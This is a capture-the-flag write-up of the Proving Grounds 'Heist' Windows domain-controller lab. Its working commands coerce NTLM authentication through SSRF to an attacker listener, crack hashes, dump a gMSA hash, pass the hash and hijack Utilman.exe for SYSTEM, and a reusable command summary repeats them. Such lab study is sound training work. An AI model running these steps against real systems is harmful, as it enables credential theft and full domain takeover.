# Heist - Proving Grounds Practice

> **Kill Chain Summary**: Web Application on Port 8080 vulnerable to SSRF -> Coercing Windows outbound authentication to Responder -> NetNTLMv2 hash cracked (enox:california) -> WinRM access -> Active Directory BloodHound enumeration reveals ReadGMSAPassword permissions over svc_apache$ -> Extracting gMSA NTLM hash with gMSADumper -> Pass-the-Hash WinRM login as svc_apache$ -> SeRestorePrivilege abused to overwrite Utilman.exe -> SYSTEM Shell via RDP screen.

| Property | Value |
|---|---|
| **Target Name** | Heist |
| **Platform** | Proving Grounds Practice |
| **OS** | Windows Server 2019 (Active Directory) |
| **Difficulty** | Hard |
| **Status** | Rooted |
| **Key Techniques** | Web Application SSRF, Forced NetNTLMv2 Authentication (Responder), BloodHound Enumeration, gMSA Exploitation (ReadGMSAPassword), Pass-the-Hash, SeRestorePrivilege (Utilman.exe Hijack) |

---

## 1. Reconnaissance and Enumeration

### 1.1 Port Scanning (Nmap)

We initiate reconnaissance with a full TCP port scan:

```bash
sudo nmap -p- --min-rate 1000 -T4 -Pn $IP -oA nmap/allports
```

**Open Ports Summary:**
```text
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
8080/tcp  open  http-proxy
9389/tcp  open  adws
```

The service profile confirms an Active Directory Domain Controller (`heist.offsec` / `w5sw.local`).

---

### 1.2 Web Enumeration: SSRF Discovery (Port 8080)

Port 8080 hosts a web application presenting a "Secure Web Browser" utility:

![Screenshot](../../attachments/Pasted%20image%2020260830194700.png)

Testing the search functionality:

![Screenshot](../../attachments/Pasted%20image%2020260830194941.png)

The application requests external URLs via a query parameter:
```text
http://192.168.x.x:8080/?url=google.com
```

Clicking the "share" button produces a localhost target:

![Screenshot](../../attachments/Pasted%20image%2020260830195253.png)

```text
http://192.168.x.x:8080/?url=http://localhost
```

We test outbound requests against a local Python web server on Kali:

```bash
python3 -m http.server 80
```

Triggering the request:
```bash
curl "http://$IP:8080/?url=http://KALI_IP/"
```

```text
192.168.x.x - - "GET / HTTP/1.1" 200 -
```

The web application returns and renders the contents of our server:

![Screenshot](../../attachments/Pasted%20image%2020260830195420.png)

Server-Side Request Forgery (SSRF) is confirmed.

---

## 2. Initial Access

### 2.1 Coercing NetNTLMv2 Authentication via SSRF

In Windows environments, when a service initiates an outbound HTTP request to an untrusted host, passing the request through Responder forces the Windows HTTP client library to negotiate NTLM authentication automatically:

1. Start Responder on the VPN interface:
   ```bash
   sudo responder -I tun0 -v
   ```

2. Trigger the SSRF targeting our Kali IP:
   ```bash
   curl "http://$IP:8080/?url=http://KALI_IP/"
   ```

3. Responder captures the NetNTLMv2 hash for the logged-in service user `enox`:
   ```text
   [HTTP] NTLMv2 Client   : 192.168.x.x
   [HTTP] NTLMv2 Username : HEIST\enox
   [HTTP] NTLMv2 Hash     : enox::HEIST:b8ae0ff998045f97:992AF44470CFAED389D6BCC8522D0E98:...
   ```

---

### 2.2 Hash Cracking and WinRM Access

We crack the captured NetNTLMv2 hash using Hashcat mode 5600:

```bash
hashcat -m 5600 -a 0 hash_enox.txt /usr/share/wordlists/rockyou.txt
```

```text
enox:california
```

Validating access and connecting via Evil-WinRM:

```bash
nxc winrm $IP -u 'enox' -p 'california'
# WINRM  192.168.x.x 5985  DC01  [+] heist.offsec\enox:california (Pwn3d!)

evil-winrm -i $IP -u 'enox' -p 'california'
```

```powershell
*Evil-WinRM* PS C:\Users\enox\Documents> whoami
heist\enox
```

Checking user flag:
```powershell
*Evil-WinRM* PS C:\Users\enox\Desktop> cat local.txt
[FLAG REDACTED]
```

---

## 3. Privilege Escalation

### 3.1 Active Directory Enumeration (BloodHound)

We gather domain data using `bloodhound-python`:

```bash
bloodhound-python -u 'enox' -p 'california' -d heist.offsec -ns $IP -c all
```

Analyzing graph paths in BloodHound reveals that `enox` belongs to a group granting the **`ReadGMSAPassword`** privilege over the Group Managed Service Account (gMSA) **`svc_apache$`**.

---

### 3.2 Exploiting gMSA (Dumping svc_apache$ Hash)

Group Managed Service Accounts have automatically managed, complex passwords stored in Active Directory attributes (`msDS-ManagedPassword`). Users with `ReadGMSAPassword` permissions can read this attribute directly:

```bash
python3 gMSADumper.py -u 'enox' -p 'california' -d 'heist.offsec' -dc-ip $IP
```

**Output:**
```text
Account: svc_apache$
NTLM Hash: 4979d69d4ca66955c075c41cf45f24dc
```

We authenticate as `svc_apache$` using Pass-the-Hash over WinRM:

```bash
evil-winrm -i $IP -u 'svc_apache$' -H '4979d69d4ca66955c075c41cf45f24dc'
```

```powershell
*Evil-WinRM* PS C:\Users\svc_apache\Documents> whoami
heist\svc_apache$
```

---

### 3.3 Elevating to SYSTEM via SeRestorePrivilege (Utilman Hijack)

Checking token privileges for `svc_apache$`:

```cmd
whoami /priv
```

```text
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                       State
============================= ================================= =======
SeBackupPrivilege             Back up files and directories     Enabled
SeRestorePrivilege            Restore files and directories     Enabled
SeShutdownPrivilege           Shut down the system              Enabled
```

With `SeRestorePrivilege` enabled, file write restrictions can be bypassed entirely. We take ownership of `utilman.exe` and replace it with `cmd.exe`:

```cmd
takeown /f C:\Windows\System32\utilman.exe
icacls C:\Windows\System32\utilman.exe /grant svc_apache$:F
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe /Y
```

#### Triggering SYSTEM Shell
1. Connect via RDP to reach the login screen:
   ```bash
   xfreerdp /u:enox /p:california /v:$IP
   ```

2. Click the Ease of Access icon in the bottom right corner. A command prompt opens with **`NT AUTHORITY\SYSTEM`** privileges:

```cmd
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\proof.txt
[FLAG REDACTED]
```

---

## 4. Useful Commands Summary

```bash
# Capture NTLM hash via SSRF
curl "http://[TARGET_IP]:8080/?url=http://[KALI_IP]/"

# Dump gMSA password hashes
python3 gMSADumper.py -u 'user' -p 'password' -d 'domain.local' -dc-ip [DC_IP]

# Pass-the-Hash with Evil-WinRM
evil-winrm -i [TARGET_IP] -u 'account$' -H [NTLM_HASH]

# SeRestorePrivilege binary replace sequence
takeown /f C:\Windows\System32\utilman.exe
icacls C:\Windows\System32\utilman.exe /grant [USER]:F
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe /Y
```

---

## 5. Key Takeaways and Lessons Learned

1. **SSRF to NetNTLM Coercion:** On Windows hosts, SSRF vectors should always be directed towards an attacker-controlled SMB/HTTP listener (Responder). Windows will attempt to negotiate NTLM authentication, exposing password hashes.
2. **Review gMSA Rights:** In Active Directory environments, always check for `ReadGMSAPassword` permissions with BloodHound. Group Managed Service Accounts often hold high privileges and their hashes can be retrieved directly without brute-force.
3. **SeRestorePrivilege Abuse:** Holding `SeRestorePrivilege` allows overwriting system binaries. When RDP is accessible, swapping `utilman.exe` with `cmd.exe` provides a reliable route to SYSTEM.

---

### Tags
#windows #active-directory #ssrf #responder #netntlm #bloodhound #gmsa #readgmsapassword #pass-the-hash #serestoreprivilege #utilman #hard #pg-practice #rooted
